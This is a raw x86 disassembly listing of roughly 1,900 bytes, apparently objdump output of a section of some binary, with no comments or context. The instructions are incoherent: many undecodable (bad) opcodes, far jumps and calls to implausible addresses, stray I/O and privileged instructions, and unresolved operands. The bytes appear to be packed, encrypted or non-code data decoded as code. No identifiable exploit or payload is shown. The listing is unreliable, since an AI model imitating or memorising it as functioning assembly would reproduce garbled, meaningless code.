  412460:	jmp    0x412401
  412462:	jmp    0x6cb345ed
  412467:	repz pop edi
  412469:	adc    BYTE PTR ds:0xb0ec03a5,cl
  41246f:	leave  
  412470:	lods   al,BYTE PTR ds:[esi]
  412471:	add    esi,eax
  412473:	(bad)  
  412474:	cmc    
  412475:	(bad)  
  412476:	push   edx
  412477:	jle    0x412435
  412479:	jns    0x4123ff
  41247b:	dec    ebx
  41247c:	icebp  
  41247d:	shl    DWORD PTR ds:0x7d584ce3,0xa0
  412484:	rcl    BYTE PTR [eax+0x2],cl
  412487:	sar    ebp,0xc8
  41248a:	cld    
  41248b:	repnz mov dh,BYTE PTR [eax]
  41248e:	arpl   WORD PTR [eax],si
  412490:	jg     0x4124d2
  412492:	leave  
  412493:	mov    esp,0x60564a24
  412498:	pop    ebx
  412499:	push   0xffffffbf
  41249b:	(bad)  
  41249c:	xchg   ecx,eax
  41249d:	jl     0x41246f
  41249f:	jo     0x41245e
  4124a1:	mov    eax,es
  4124a3:	(bad)  
  4124a4:	out    dx,eax
  4124a5:	sbb    DWORD PTR [ebx-0x38],edi
  4124a8:	cwde   
  4124a9:	leave  
  4124aa:	out    0xbb,eax
  4124ac:	and    DWORD PTR [esi+0x33995e7e],esp
  4124b2:	fldl2e 
  4124b4:	inc    esp
  4124b5:	xor    eax,0x373acacb
  4124ba:	sub    ecx,DWORD PTR [ebp-0x40]
  4124bd:	sar    DWORD PTR [eax-0x680499e2],0x37
  4124c4:	xchg   edi,eax
  4124c5:	ss fdivr st,st(0)
  4124c8:	(bad)  
  4124c9:	pusha  
  4124ca:	xchg   esi,eax
  4124cb:	xor    al,0xb2
  4124cd:	fdiv   QWORD PTR [ebx]
  4124cf:	rcl    BYTE PTR [edi+ebx*2],0xc9
  4124d3:	aaa    
  4124d4:	jg     0x412517
  4124d6:	push   ds
  4124d7:	mov    ds:0x6ba7d99d,eax
  4124dc:	les    edx,FWORD PTR [eax+0x6a7a0e6a]
  4124e2:	ja     0x4124be
  4124e4:	pushf  
  4124e5:	jne    0x4124df
  4124e7:	scas   al,BYTE PTR es:[edi]
  4124e8:	leave  
  4124e9:	ins    BYTE PTR es:[edi],dx
  4124ea:	push   cs
  4124eb:	ins    DWORD PTR es:[edi],dx
  4124ec:	mov    ah,0x25
  4124ee:	jbe    0x4124e7
  4124f0:	or     eax,DWORD PTR [edx+ebx*4-0x47]
  4124f4:	and    BYTE PTR [edx+ebp*4+0x42],dh
  4124f8:	aas    
  4124f9:	push   ds
  4124fa:	jne    0x412507
  4124fc:	iret   
  4124fd:	loope  0x4124d0
  4124ff:	ins    BYTE PTR es:[edi],dx
  412500:	inc    esp
  412501:	into   
  412502:	scas   eax,DWORD PTR es:[edi]
  412503:	and    ecx,DWORD PTR [ebx-0x2b]
  412506:	dec    eax
  412507:	cmp    esp,edx
  412509:	in     eax,0xd2
  41250b:	outs   dx,BYTE PTR ds:[esi]
  41250c:	fstp   DWORD PTR [esi]
  41250e:	sub    ah,bh
  412510:	fwait
  412511:	inc    esp
  412512:	mov    BYTE PTR ds:[edx-0x73],bh
  412516:	jmp    0x751a3c8c
  41251b:	fadd   QWORD PTR [esi+0x67]
  41251e:	lds    ecx,FWORD PTR [eax-0x77]
  412521:	sar    DWORD PTR [ebx+0x78],0xc3
  412525:	jle    0x412514
  412527:	inc    edx
  412528:	test   esi,ebp
  41252a:	add    eax,0x9b15b214
  41252f:	cmp    DWORD PTR ds:0xdf596e12,edx
  412535:	sbb    eax,0x263c1e16
  41253a:	sbb    BYTE PTR [esi-0x7c],ah
  41253d:	imul   esp,DWORD PTR [ecx+0x55ff6d5f],0x435e2734
  412547:	jno    0x4124dd
  412549:	mov    eax,ds:0xd2d563c5
  41254e:	lods   al,BYTE PTR ds:[esi]
  41254f:	and    al,0x30
  412551:	add    ebp,DWORD PTR [ebx-0x30]
  412554:	repnz push eax
  412556:	(bad)  
  412557:	retf   
  412558:	rcr    DWORD PTR [ebp+ecx*2-0x48],cl
  41255c:	push   ds
  41255d:	cmp    al,0xe1
  41255f:	inc    ebx
  412560:	and    BYTE PTR [edx],cl
  412562:	mov    ebp,0x3ac1b168
  412567:	jg     0x4124f5
  412569:	xor    al,ah
  41256b:	add    eax,0xccd9c375
  412570:	sbb    eax,0x3582fa14
  412575:	repnz and al,0xca
  412578:	pop    ss
  412579:	mov    ch,0x49
  41257b:	xchg   BYTE PTR [ebx+0x77],dh
  41257e:	jnp    0x412505
  412580:	es mov dh,0x9
  412583:	hlt    
  412584:	in     al,dx
  412585:	pushf  
  412586:	out    0xda,eax
  412588:	jg     0x412547
  41258a:	pop    esp
  41258b:	imul   eax,DWORD PTR [ebx],0x108fde0b
  412591:	sbb    BYTE PTR [eax+0x7c],bh
  412594:	repnz mov bh,dh
  412597:	shl    BYTE PTR [edi+0x203145ac],1
  41259d:	test   al,0x86
  41259f:	jmp    0x44ae9b38
  4125a4:	call   0x50e5:0x1c364402
  4125ab:	push   esi
  4125ac:	or     eax,0x253ac122
  4125b1:	add    esi,DWORD PTR [esi+0x1d]
  4125b4:	test   al,0x8c
  4125b6:	pop    edx
  4125b7:	push   edx
  4125b8:	inc    eax
  4125b9:	mov    fs,WORD PTR [ebx+0x12]
  4125bc:	imul   DWORD PTR [eax-0x9458c4d]
  4125c2:	and    BYTE PTR gs:[ecx-0x3d],0x1e
  4125c7:	dec    edx
  4125c8:	xlat   BYTE PTR ds:[ebx]
  4125c9:	pop    es
  4125ca:	mov    WORD PTR [edx+0x422b407e],gs
  4125d0:	lods   al,BYTE PTR ds:[esi]
  4125d1:	or     eax,edi
  4125d3:	sbb    eax,0x79138ab9
  4125d8:	xor    DWORD PTR ds:0x55e834f0,edi
  4125de:	add    ah,dh
  4125e0:	xor    DWORD PTR [ecx-0x19b7bc4],edi
  4125e6:	ins    BYTE PTR es:[edi],dx
  4125e7:	scas   eax,DWORD PTR es:[edi]
  4125e8:	pushf  
  4125e9:	mov    ch,0xb1
  4125eb:	push   0x16604ceb
  4125f0:	scas   eax,DWORD PTR es:[edi]
  4125f1:	push   ss
  4125f2:	test   DWORD PTR [edx-0x6056a6f0],0x7ece63db
  4125fc:	fldl2t 
  4125fe:	add    DWORD PTR [edx],esp
  412600:	inc    esp
  412601:	pop    edi
  412602:	and    eax,0xa25b6ec7
  412607:	aam    0x5b
  412609:	std    
  41260a:	retf   0x50f4
  41260d:	repz mov esp,0xe12a24e9
  412613:	jmp    0x412679
  412615:	test   BYTE PTR [eax],al
  412617:	es cld 
  412619:	and    ebp,edi
  41261b:	leave  
  41261c:	(bad)  
  41261d:	aad    0x59
  41261f:	mov    al,ds:0x6019c38e
  412624:	addr16 mov ch,0xd7
  412627:	cwde   
  412628:	xchg   ecx,eax
  412629:	cld    
  41262a:	lea    ecx,[eax+ecx*1-0x64]
  41262e:	or     dl,ah
  412630:	je     0x41262d
  412632:	sub    ecx,0x1
  412635:	loope  0x4125f8
  412637:	(bad)  
  412638:	scas   eax,DWORD PTR es:[edi]
  412639:	std    
  41263a:	pushf  
  41263b:	xor    eax,0x742ef89c
  412640:	sbb    bl,BYTE PTR [esi+0x213238c6]
  412646:	mov    WORD PTR [eax],?
  412648:	pop    eax
  412649:	xchg   esp,eax
  41264a:	adc    BYTE PTR [ecx],ch
  41264c:	sbb    DWORD PTR [edx-0x57],ebx
  41264f:	scas   al,BYTE PTR es:[edi]
  412650:	dec    edi
  412651:	adc    al,0xe3
  412653:	mov    ebx,DWORD PTR [esi-0x550fdfbc]
  412659:	xor    BYTE PTR [ebx-0x69ad503e],bh
  41265f:	jg     0x412655
  412661:	(bad)  
  412662:	outs   dx,DWORD PTR ds:[esi]
  412663:	xor    BYTE PTR [ecx+0x32],bl
  412666:	aad    0x29
  412668:	ret    
  412669:	std    
  41266a:	add    eax,0xd423bf73
  41266f:	inc    ebx
  412670:	add    al,0xa0
  412672:	lea    edx,ds:0xf59568c
  412678:	xchg   esi,eax
  412679:	fwait
  41267a:	inc    edi
  41267b:	ror    DWORD PTR [ebp+0x76352279],cl
  412681:	push   0xa
  412683:	sub    al,0x7
  412685:	ins    BYTE PTR es:[edi],dx
  412686:	fild   DWORD PTR [esi]
  412688:	pushf  
  412689:	dec    edx
  41268a:	cmp    al,0x11
  41268c:	repnz pop ebx
  41268e:	add    edx,esp
  412690:	lds    esp,FWORD PTR [edx+eiz*1+0x78]
  412694:	fs mov dh,0xce
  412697:	loope  0x412658
  412699:	(bad)  
  41269a:	shl    DWORD PTR [eax],1
  41269c:	pusha  
  41269d:	pop    esi
  41269e:	and    BYTE PTR [ebx-0x43],ah
  4126a1:	push   es
  4126a2:	add    al,0x5c
  4126a4:	daa    
  4126a5:	(bad)  
  4126a6:	aam    0xbc
  4126a8:	mov    ebp,0xd7584df9
  4126ad:	leave  
  4126ae:	cmp    ah,BYTE PTR [ebx]
  4126b0:	pop    ss
  4126b1:	loopne 0x41271f
  4126b3:	jp     0x4126d5
  4126b5:	adc    BYTE PTR [esi+0x4a],dh
  4126b8:	add    al,0xc1
  4126ba:	mov    edx,esp
  4126bc:	rol    DWORD PTR [eax-0x64],1
  4126bf:	out    dx,eax
  4126c0:	addr16 arpl bp,bx
  4126c3:	cmp    ah,BYTE PTR [eax-0x16650471]
  4126c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126ca:	mov    dh,0xb7
  4126cc:	daa    
  4126cd:	stos   BYTE PTR es:[edi],al
  4126ce:	pusha  
  4126cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126d0:	and    DWORD PTR [ecx],edi
  4126d2:	pop    esi
  4126d3:	mov    esp,0x4a26dcf4
  4126d8:	fcmovne st,st(4)
  4126da:	iret   
  4126db:	pop    ebp
  4126dc:	loop   0x4126d1
  4126de:	scas   al,BYTE PTR es:[edi]
  4126df:	ret    
  4126e0:	std    
  4126e1:	inc    ebx
  4126e2:	xlat   BYTE PTR ds:[ebx]
  4126e3:	push   ss
  4126e4:	mov    ch,0x56
  4126e6:	in     al,dx
  4126e7:	bound  esp,QWORD PTR [ebx+edi*2]
  4126ea:	arpl   WORD PTR [edi-0x7e87e028],cx
  4126f0:	xchg   edx,eax
  4126f1:	push   0xdb29e927
  4126f6:	inc    esp
  4126f7:	daa    
  4126f8:	gs int3 
  4126fa:	cld    
  4126fb:	pop    ds
  4126fc:	test   DWORD PTR [ebp+0x7b16669e],eax
  412702:	cmp    DWORD PTR [edx+0x70],ebx
  412705:	fnsave [ebx+0x2]
  412708:	xor    al,0x80
  41270a:	sub    esp,DWORD PTR [ecx*1+0x1662372]
  412711:	xor    esi,DWORD PTR [ecx]
  412713:	rcl    DWORD PTR [edx+0x47],0x19
  412717:	inc    esp
  412718:	push   es
  412719:	push   ds
  41271a:	in     al,dx
  41271b:	dec    ebp
  41271c:	adc    esi,edi
  41271e:	fidivr WORD PTR [edi+0x90bb21c]
  412724:	(bad)  
  412726:	mov    eax,ds:0xd515fef2
  41272b:	dec    edx
  41272c:	jnp    0x412723
  41272e:	adc    DWORD PTR [ebx+0x5951e9e4],ebp
  412734:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412735:	mov    DWORD PTR [edx+0x7eb62178],edi
  41273b:	push   ss
  41273c:	jnp    0x412752
  41273e:	mov    edi,0x3920956e
  412743:	fmul   QWORD PTR [esi]
  412745:	sbb    dl,BYTE PTR [edx+0x8f9e24e]
  41274b:	xchg   edx,eax
  41274c:	jg     0x41276a
  41274e:	xor    BYTE PTR [esi],cl
  412750:	int    0x8f
  412752:	add    eax,0x250fb1dd
  412757:	mov    bl,0x4b
  412759:	mov    DWORD PTR [esi+0x171c9b32],edx
  41275f:	sub    eax,0x4ef1add
  412764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412765:	pop    es
  412766:	push   0xce8b25ba
  41276b:	scas   al,BYTE PTR es:[edi]
  41276c:	stos   DWORD PTR es:[edi],eax
  41276d:	mov    ecx,?
  41276f:	push   ebp
  412770:	push   ecx
  412771:	push   ss
  412772:	scas   eax,DWORD PTR es:[edi]
  412773:	mov    ah,0xd6
  412776:	lods   eax,DWORD PTR ds:[esi]
  412777:	xchg   edx,eax
  412778:	(bad)  
  41277a:	ret    
  41277b:	cs ins BYTE PTR es:[edi],dx
  41277d:	mov    WORD PTR [ebx+0x7ad5bbdf],cs
  412783:	add    al,0x6
  412785:	jmp    0x8892:0x8276c8b4
  41278c:	neg    DWORD PTR [edi+0x1]
  41278f:	fcom   st(3)
  412791:	adc    BYTE PTR [edx+0x3270ecf4],bl
  412797:	rcl    BYTE PTR [esi],0xb6
  41279a:	dec    esi
  41279b:	add    al,0x7d
  41279d:	xchg   edi,eax
  41279e:	dec    ebx
  41279f:	mov    ds:0xa23dee4,al
  4127a4:	pop    esi
  4127a5:	fadd   QWORD PTR [ebx+0x39a9e800]
  4127ab:	scas   eax,DWORD PTR es:[edi]
  4127ac:	dec    esi
  4127ad:	mov    dl,0x7f
  4127af:	xor    al,0xca
  4127b1:	ja     0x4127d1
  4127b3:	pop    edx
  4127b4:	mov    ds:0x771b3748,eax
  4127b9:	mov    bl,0xfd
  4127bb:	sahf   
  4127bc:	inc    ebp
  4127bd:	pop    esp
  4127be:	fs (bad) 
  4127c0:	cdq    
  4127c1:	je     0x412759
  4127c3:	fs dec edi
  4127c5:	and    al,0xd0
  4127c7:	iret   
  4127c8:	xchg   esi,eax
  4127c9:	loop   0x4127b9
  4127cb:	mov    ds:0x7f38444a,eax
  4127d0:	mov    cl,0x90
  4127d2:	ss jno 0x4127c8
  4127d5:	add    eax,0x3adad90c
  4127da:	adc    BYTE PTR [ecx],0xa6
  4127dd:	pop    eax
  4127de:	dec    edi
  4127df:	mov    ch,0xa7
  4127e1:	mov    ?,WORD PTR [ecx]
  4127e3:	dec    edx
  4127e4:	imul   edx,DWORD PTR [ebp-0x5a],0xffffffea
  4127e8:	push   ds
  4127e9:	jns    0x41282d
  4127eb:	mov    dl,ah
  4127ed:	xchg   edx,eax
  4127ee:	adc    al,0x24
  4127f0:	xchg   BYTE PTR ds:[edi+edx*8],bh
  4127f4:	xchg   BYTE PTR [esi+0x3fb3935],dl
  4127fa:	jge    0x4127a3
  4127fc:	sbb    edi,ecx
  4127fe:	gs jg  0x41283a
  412801:	fiadd  WORD PTR [ecx+0x12]
  412804:	fistp  WORD PTR [edx]
  412806:	jmp    0x92d9a40b
  41280b:	and    edi,ecx
  41280d:	add    ah,ah
  41280f:	sub    al,BYTE PTR [esi+ebp*1]
  412812:	mov    dl,0x48
  412814:	cmp    BYTE PTR [edi+edx*8],0x42
  412818:	jl     0x41284a
  41281a:	xor    edi,DWORD PTR [edi-0xe]
  41281d:	xchg   ebx,eax
  41281e:	pop    es
  41281f:	iret   
  412820:	mov    WORD PTR [ebx+eiz*8+0x1e547594],es
  412827:	and    ecx,DWORD PTR [edx+0x7b]
  41282a:	mov    ebp,0x455c0ada
  41282f:	(bad)  
  412830:	frndint 
  412832:	lods   eax,DWORD PTR ds:[esi]
  412833:	das    
  412834:	pop    ecx
  412835:	and    al,0x5c
  412837:	xor    DWORD PTR [esi],esp
  412839:	aad    0xba
  41283b:	jmp    0x26b06dd7
  412840:	jne    0x412820
  412842:	fld    DWORD PTR [edi+0x69]
  412845:	pusha  
  412846:	dec    eax
  412847:	call   0xabb71acf
  41284c:	jmp    0x4128a4
  41284e:	inc    eax
  41284f:	retf   0x124e
  412852:	jmp    0x3fab47ca
  412857:	or     DWORD PTR [edi+0xdc14417],0x33d23ac3
  412861:	inc    ebp
  412862:	jne    0x412803
  412864:	test   DWORD PTR [ebx-0x33],ebx
  412867:	arpl   bp,dx
  412869:	popa   
  41286a:	nop
  41286b:	push   ds
  41286c:	sub    edx,edx
  41286e:	pop    ebp
  41286f:	mov    BYTE PTR [ecx-0x79d74318],ch
  412875:	in     al,dx
  412876:	mov    bh,0xf6
  412878:	rol    BYTE PTR [esi-0x43c0e389],1
  41287e:	jno    0x4128bf
  412880:	pop    es
  412881:	mov    edx,0x2dd31ca1
  412886:	shl    BYTE PTR [esi+edi*2],cl
  412889:	lahf   
  41288a:	sub    DWORD PTR [edx],esi
  41288c:	ret    
  41288d:	int    0xfe
  41288f:	add    BYTE PTR ss:[esi],ah
  412892:	push   0xffffffbb
  412894:	jne    0x412908
  412896:	push   esp
  412897:	sub    esi,DWORD PTR [edx+eax*1-0x26]
  41289b:	mov    bl,0x6f
  41289d:	or     BYTE PTR [ebx+edi*1],dl
  4128a0:	jl     0x412890
  4128a2:	add    BYTE PTR [eax-0x45fc3b1f],0xfd
  4128a9:	bound  edx,QWORD PTR [esi-0x21ea4d42]
  4128af:	mov    gs:0xc903e7e7,eax
  4128b5:	adc    al,0x9e
  4128b7:	push   0xe05dea3e
  4128bc:	jbe    0x41290c
  4128be:	jl     0x4128d7
  4128c0:	mov    dh,0xa2
  4128c2:	ds int3 
  4128c4:	adc    al,0x86
  4128c6:	out    0x60,eax
  4128c8:	add    ebp,edx
  4128ca:	add    BYTE PTR [ebp-0x741a72ca],ah
  4128d0:	pop    edi
  4128d1:	cs into 
  4128d3:	(bad)  
  4128d4:	mov    ds:0xbf16d0fb,al
  4128d9:	sbb    DWORD PTR [ebp+0xde08845],ebp
  4128df:	push   0x77
  4128e1:	jg     0x412870
  4128e3:	push   0x34
  4128e5:	dec    ebp
  4128e6:	repz mov ecx,0x26bfdc1e
  4128ec:	stc    
  4128ed:	pop    ds
  4128ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128ef:	or     DWORD PTR [ebx-0x37],ebx
  4128f2:	xchg   ah,dh
  4128f4:	dec    ecx
  4128f5:	nop
  4128f6:	in     al,dx
  4128f7:	repnz push esp
  4128f9:	out    0x76,al
  4128fb:	repz iret 
  4128fd:	jae    0x412951
  4128ff:	pop    ebx
  412900:	es mov ecx,0xfafff77e
  412906:	hlt    
  412907:	out    dx,al
  412908:	mov    al,ds:0x686e0561
  41290d:	shl    esi,0x51
  412910:	sbb    cl,BYTE PTR [ebx-0x457299d7]
  412916:	xor    BYTE PTR [ebp+0x786b5595],ah
  41291c:	or     edx,DWORD PTR [edi]
  41291e:	pop    DWORD PTR [esi-0x140162bd]
  412924:	loope  0x4128f3
  412926:	ins    BYTE PTR es:[edi],dx
  412927:	sbb    bh,ch
  412929:	pop    eax
  41292a:	lods   eax,DWORD PTR ds:[esi]
  41292b:	idiv   DWORD PTR [esi]
  41292d:	cdq    
  41292e:	mov    ah,0xd3
  412930:	dec    edi
  412931:	jbe    0x412912
  412933:	sbb    DWORD PTR [eax-0x22],esi
  412936:	jg     0x412952
  412938:	je     0x412974
  41293a:	or     bl,dh
  41293c:	test   eax,0x4ebc04c1
  412941:	lahf   
  412942:	xchg   ecx,eax
  412943:	(bad)  
  412944:	adc    BYTE PTR [ebx-0x70ba34f4],dh
  41294a:	inc    edi
  41294b:	push   ss
  41294c:	pusha  
  41294d:	aad    0xcf
  41294f:	data16 xlat BYTE PTR ds:[ebx]
  412951:	xor    eax,0x6d31192b
  412956:	jb     0x4129b1
  412958:	inc    eax
  412959:	(bad)  
  41295a:	sub    eax,0xe1654194
  41295f:	push   ss
  412960:	mov    DWORD PTR [eax-0x10f4159a],ebp
  412966:	push   0xffffffa8
  412968:	(bad)  
  412969:	push   ds
  41296a:	call   0x9933:0xfd47859b
  412971:	jmp    0x5b8:0xcf7b5ebc
  412978:	mov    dl,0x6b
  41297a:	aam    0xdf
  41297c:	repz es mov dl,0x37
  412980:	ins    BYTE PTR es:[edi],dx
  412981:	add    BYTE PTR [edx],0x4c
  412984:	dec    esi
  412985:	or     al,0x52
  412987:	add    ah,BYTE PTR [ebx+0x7d]
  41298a:	jns    0x412952
  41298c:	pusha  
  41298d:	cmp    dl,cl
  41298f:	cli    
  412990:	push   es
  412991:	pop    ecx
  412992:	ds inc ecx
  412994:	sbb    eax,0x547a57d6
  412999:	pop    eax
  41299a:	fist   WORD PTR [ebx+ebx*1+0x5a]
  41299e:	arpl   ax,cx
  4129a0:	or     cl,al
  4129a2:	pop    esi
  4129a3:	inc    esp
  4129a4:	mul    BYTE PTR ss:[ecx+0x2a]
  4129a8:	cmp    eax,DWORD PTR [edx+0x5a5d39d5]
  4129ae:	in     al,0xb4
  4129b0:	cld    
  4129b1:	or     ebp,DWORD PTR [ebx]
  4129b3:	sbb    al,BYTE PTR [edx]
  4129b5:	cbw    
  4129b7:	cwde   
  4129b8:	sub    esi,DWORD PTR [eax]
  4129ba:	sub    ebx,DWORD PTR [eax-0x3f6c02a3]
  4129c0:	sbb    ecx,0x0
  4129c3:	imul   DWORD PTR [eax-0x35]
  4129c6:	pop    esp
  4129c7:	shl    DWORD PTR [esi],1
  4129c9:	xchg   edi,eax
  4129ca:	fmul   DWORD PTR [esi-0x655339fa]
  4129d0:	sbb    eax,0x4466f380
  4129d5:	cmp    dh,ch
  4129d7:	inc    esp
  4129d8:	push   esp
  4129d9:	sub    esp,0x9f5601ad
  4129df:	sub    al,0xcd
  4129e1:	in     eax,0x67
  4129e3:	sub    dh,BYTE PTR [ecx-0x5f]
  4129e6:	inc    ecx
  4129e7:	push   ebp
  4129e8:	and    BYTE PTR [esi+eiz*4],0xdd
  4129ec:	push   edx
  4129ed:	imul   ebp,DWORD PTR [ebp-0x436c8bd7],0x56e21721
  4129f7:	jne    0x412a29
  4129f9:	push   eax
  4129fa:	xor    DWORD PTR [esi-0x4b],0xffffffb7
  4129fe:	xchg   DWORD PTR [ebx-0xbb71af8],eax
  412a04:	mov    cs,WORD PTR [edi]
  412a06:	add    BYTE PTR [eax],ch
  412a08:	sub    dh,0x93
  412a0b:	pop    ss
  412a0c:	cmc    
  412a0d:	hlt    
  412a0e:	mov    dl,0x37
  412a10:	das    
  412a11:	inc    edi
  412a12:	ds mov edi,0x93a05a05
  412a18:	cmp    BYTE PTR [edx],al
  412a1a:	retf   
  412a1b:	push   ebp
  412a1c:	dec    esi
  412a1d:	call   0x9b93d1a
  412a22:	push   edx
  412a23:	mov    edi,0xb028784
  412a28:	fisttp WORD PTR [esi-0x6c]
  412a2b:	and    BYTE PTR [esi-0x75],0x72
  412a2f:	je     0x4129df
  412a31:	push   edx
  412a32:	mov    eax,0x90bf2f2f
  412a37:	push   eax
  412a38:	cli    
  412a39:	or     al,0xc2
  412a3b:	xchg   ebx,eax
  412a3c:	mov    esi,0x4907cdf7
  412a41:	sbb    esi,edx
  412a43:	mov    ds,WORD PTR [eax+0x58]
  412a46:	idiv   BYTE PTR [edx]
  412a48:	rol    DWORD PTR [ebx+0x1db64c06],1
  412a4e:	sub    DWORD PTR [esi],ebp
  412a50:	push   ecx
  412a51:	in     eax,dx
  412a52:	jno    0x4129f9
  412a54:	add    dh,0x31
  412a57:	jge    0x412a5d
  412a59:	sbb    DWORD PTR [eax-0x26e03585],eax
  412a5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a60:	mov    al,ds:0xa7af55c0
  412a65:	into   
  412a66:	adc    dh,BYTE PTR [ecx]
  412a68:	sbb    DWORD PTR [eax],eax
  412a6a:	dec    edi
  412a6b:	inc    esi
  412a6c:	or     DWORD PTR [eax+0x8f0c5b6],esp
  412a72:	inc    ecx
  412a73:	sahf   
  412a74:	xchg   esp,eax
  412a75:	mov    esi,0x96528079
  412a7a:	inc    cx
  412a7c:	popa   
  412a7d:	jbe    0x412aea
  412a7f:	add    BYTE PTR [ebx+0x3fa65d67],0xec
  412a86:	das    
  412a87:	sub    DWORD PTR [esi+0x591d487c],ebx
  412a8d:	jne    0x412a35
  412a8f:	lock shl DWORD PTR [eax],0xf7
  412a93:	clc    
  412a94:	test   eax,0x1c37cb1f
  412a99:	xchg   edx,eax
  412a9a:	and    al,0xbd
  412a9c:	stc    
  412a9d:	ins    BYTE PTR es:[edi],dx
  412a9e:	pop    edx
  412a9f:	jo     0x412afc
  412aa1:	mov    ebx,0x3249cb95
  412aa6:	dec    edi
  412aa7:	push   edx
  412aa8:	add    bh,BYTE PTR [edi+0x4707a15d]
  412aae:	fwait
  412aaf:	mov    ebp,0xad33b5e3
  412ab4:	(bad)  
  412ab6:	outs   dx,DWORD PTR ds:[esi]
  412ab7:	jmp    0xfc09:0x4aac6815
  412abe:	stc    
  412abf:	and    al,0x2f
  412ac1:	inc    esi
  412ac2:	xor    bh,BYTE PTR [ebx+0x24516c89]
  412ac8:	mov    bl,BYTE PTR [ebp-0x1b]
  412acb:	mov    bl,0x27
  412acd:	mov    edx,0xfffef902
  412ad2:	iret   
  412ad3:	daa    
  412ad4:	arpl   WORD PTR [eax-0x129097c0],cx
  412ada:	in     eax,0x45
  412adc:	dec    eax
  412add:	sbb    edx,DWORD PTR [eax]
  412adf:	add    ah,dl
  412ae1:	aam    0x2e
  412ae3:	cmp    bl,BYTE PTR ds:0xd17c0611
  412ae9:	jle    0x412b46
  412aeb:	lea    ecx,[eax-0x29]
  412aee:	jmp    0x412b40
  412af0:	clc    
  412af1:	aam    0x95
  412af3:	in     eax,0x8
  412af5:	sbb    edi,DWORD PTR [ecx-0x2e]
  412af8:	dec    ecx
  412af9:	out    dx,eax
  412afa:	pop    esp
  412afb:	pop    ss
  412afc:	mov    esi,0x838e3a42
  412b01:	hlt    
  412b02:	dec    esi
  412b03:	push   eax
  412b04:	jmp    0x412ac8
  412b06:	sbb    edx,DWORD PTR [esi+ebx*8-0x74e2a7c4]
  412b0d:	fsub   st,st(6)
  412b0f:	mov    ebp,DWORD PTR [edx+0x12]
  412b12:	mov    esi,0x9f44752c
  412b18:	aas    
  412b19:	cmp    BYTE PTR [edi],ch
  412b1b:	fstp   DWORD PTR [ecx-0x63]
  412b1e:	push   esp
  412b1f:	les    edx,FWORD PTR [eax]
  412b21:	xchg   ebp,eax
  412b22:	xchg   ecx,ebp
  412b24:	push   esp
  412b25:	mov    bl,0x4c
  412b27:	fst    QWORD PTR [eax]
  412b29:	push   edx
  412b2a:	pop    es
  412b2b:	jne    0x412b8b
  412b2d:	shr    DWORD PTR [edi+eiz*4],cl
  412b30:	sub    al,0xa7
  412b32:	jl     0x412ba8
  412b34:	mov    esi,0xc0f6418a
  412b39:	mov    ebx,0xcf352279
  412b3e:	mov    ds:0x2425af42,al
  412b43:	jbe    0x412b71
  412b45:	lods   eax,DWORD PTR ds:[esi]
  412b46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b47:	addr16 iret 
  412b49:	int    0x82
  412b4b:	aad    0x21
  412b4d:	(bad)  
  412b4f:	js     0x412b6f
  412b51:	dec    edx
  412b52:	or     BYTE PTR [ebp+0x5677b218],ah
  412b58:	bound  eax,QWORD PTR [edi-0x23d1feab]
  412b5e:	rcl    esp,1
  412b60:	sahf   
  412b61:	(bad)  
  412b62:	in     eax,dx
  412b63:	in     eax,dx
  412b64:	aad    0xdd
  412b66:	pop    ecx
  412b67:	dec    esi
  412b68:	mov    gs,WORD PTR [edx]
  412b6a:	inc    ebx
  412b6b:	ins    BYTE PTR es:[edi],dx
  412b6c:	mov    dh,0x52
  412b6e:	fwait
  412b6f:	ins    DWORD PTR es:[edi],dx
  412b70:	inc    edi
  412b71:	xlat   BYTE PTR ds:[ebx]
  412b72:	clc    
  412b73:	jecxz  0x412b01
  412b75:	sub    BYTE PTR [edi-0x42c74e9d],ah
  412b7b:	loop   0x412b6e
  412b7d:	sahf   
  412b7e:	inc    edx
  412b7f:	icebp  
  412b80:	sbb    BYTE PTR [ebx-0x30],ch
  412b83:	fstp   QWORD PTR ds:0xa5a23907
  412b89:	lock push ebx
  412b8b:	dec    ebx
  412b8c:	adc    eax,ecx
  412b8e:	cmc    
  412b8f:	cwde   
  412b90:	mov    edi,0x13f4644e
  412b95:	xchg   ebx,eax
  412b96:	xchg   ebx,eax
  412b97:	add    BYTE PTR [ecx+ebx*1-0x25],ch
  412b9b:	enter  0xf947,0xac
  412b9f:	jp     0x412bf2
  412ba1:	dec    edx
  412ba2:	jns    0x412b25
  412ba4:	push   ss
  412ba5:	sub    al,0x96
  412ba7:	dec    edx
  412ba8:	mov    bl,0x7f
  412baa:	imul   edi,DWORD PTR [ecx],0xf88d4c10
  412bb0:	imul   edi,DWORD PTR [edx+0x25],0x45e9542f
  412bb7:	frstorw [edi+ebx*4]
  412bbb:	lods   al,BYTE PTR ds:[esi]
  412bbc:	scas   al,BYTE PTR es:[edi]
  412bbd:	sbb    ebp,DWORD PTR [edx-0x8]
  412bc0:	jmp    0x2555ad6d
  412bc5:	stos   DWORD PTR es:[edi],eax
  412bc6:	add    edi,DWORD PTR [ebx+0x43]
  412bc9:	gs or  al,0xb2
  412bcc:	add    ch,BYTE PTR [esi-0x72]
  412bcf:	dec    ebx
  412bd0:	arpl   WORD PTR [edx],si
  412bd2:	or     eax,0x5964b0ec
  412bd7:	loop   0x412bd9
  412bd9:	mov    ch,0xaf
  412bdb:	xchg   esi,eax
  412bdc:	push   ecx
  412bdd:	dec    esi
  412bde:	(bad)  
  412bdf:	and    eax,0x9e9a3856
  412be4:	sub    eax,DWORD PTR [esi+edx*2]
  412be7:	jo     0x412ba6
  412be9:	inc    edx
  412bea:	adc    al,0xe9
  412bec:	or     edi,DWORD PTR [ecx]
  412bee:	cdq    
  412bef:	pop    ebp
  412bf0:	lahf   
  412bf1:	ficom  DWORD PTR [eax+0x64c81719]
  412bf7:	add    al,0x48
  412bf9:	xor    dx,ax
  412bfc:	lods   al,BYTE PTR ds:[esi]
  412bfd:	in     al,0x71
  412bff:	sahf   
  412c00:	xchg   ecx,eax
  412c01:	lock mov esi,0xb6c1f402
  412c07:	shl    DWORD PTR [eax+0x1a7dcbad],1
  412c0d:	cli    
  412c0e:	mov    WORD PTR [esi+0x2f],ds
  412c11:	scas   al,BYTE PTR es:[edi]
  412c12:	leave  
